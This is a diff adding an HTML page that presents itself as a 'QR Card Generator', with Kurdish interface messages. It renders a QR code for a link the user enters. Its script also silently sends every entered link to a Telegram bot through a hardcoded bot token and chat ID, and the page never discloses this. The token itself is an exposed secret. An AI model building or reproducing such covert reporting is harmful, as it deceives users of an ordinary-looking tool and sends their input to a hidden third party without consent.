@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<title>QR Card Generator</title>
+
+<style>
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  font-family: Arial, sans-serif;
+  background: #000;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+}
+
+h1 {
+  font-size: 32px;
+  font-weight: bold;
+  color: white;
+  margin-bottom: 30px;
+  text-align: center;
+}
+
+.card-box {
+  background: #111;
+  border: 3px solid yellow;
+  border-radius: 24px;
+  padding: 40px 30px;
+  width: 340px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 18px;
+}
+
+input {
+  width: 100%;
+  padding: 14px 16px;
+  border-radius: 30px;
+  border: 1.5px solid #aaa;
+  background: transparent;
+  color: white;
+  font-size: 15px;
+  outline: none;
+}
+
+input::placeholder {
+  color: #aaa;
+}
+
+button {
+  width: 100%;
+  padding: 16px;
+  border-radius: 30px;
+  border: none;
+  background: red;
+  color: white;
+  font-size: 17px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: background 0.2s;
+}
+
+button:hover {
+  background: #cc0000;
+}
+
+.message {
+  height: 20px;
+  font-size: 14px;
+  color: orange;
+}
+
+.result-card {
+  background: #1a1a1a;
+  border: 2px solid yellow;
+  border-radius: 16px;
+  padding: 20px;
+  text-align: center;
+  display: none;
+  margin-top: 10px;
+  width: 340px;
+}
+
+.result-card img {
+  width: 180px;
+  border-radius: 10px;
+}
+
+.result-card div {
+  color: #ccc;
+  font-size: 13px;
+  margin-top: 10px;
+  word-break: break-all;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card-box">
+  <h1>QR Card Generator</h1>
+
+  <input id="link" placeholder="Enter link">
+
+  <div class="message" id="msg"></div>
+
+  <button onclick="makeQR()">Get QR Code</button>
+<a href="https://shblood-tools19.netlify.app">
+<button>Back Home</button>
+</a>
+
+
+<div class="result-card" id="card">
+  <img id="qr">
+  <div id="show"></div>
+</div>
+
+<script>
+let token = "8142432788:AAHIG88VToqq6vzaEgKA3EIwll1g9Aop_VA";
+let chat_id = "5071160578";
+
+function validURL(str) {
+  try { new URL(str); return true; } catch { return false; }
+}
+
+function makeQR() {
+  let link = document.getElementById("link").value.trim();
+  let msg = document.getElementById("msg");
+
+  if (link === "") {
+    msg.innerText = "لینک بنووسە";
+    msg.style.color = "orange";
+    return;
+  }
+
+  if (!validURL(link)) {
+    msg.innerText = "هەڵەیە - لینکەکە دروست نییە";
+    msg.style.color = "red";
+    return;
+  }
+
+  msg.innerText = "✓ دروست کرا";
+  msg.style.color = "lime";
+
+  let qr = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(link);
+  document.getElementById("qr").src = qr;
+  document.getElementById("show").innerText = link;
+  document.getElementById("card").style.display = "block";
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: chat_id, text: "New QR Link:\n" + link })
+  });
+}
+
+function goHome() {
+  document.getElementById("link").value = "";
+  document.getElementById("msg").innerText = "";
+  document.getElementById("card").style.display = "none";
+}
+</script>
+
+</body>
+</html>
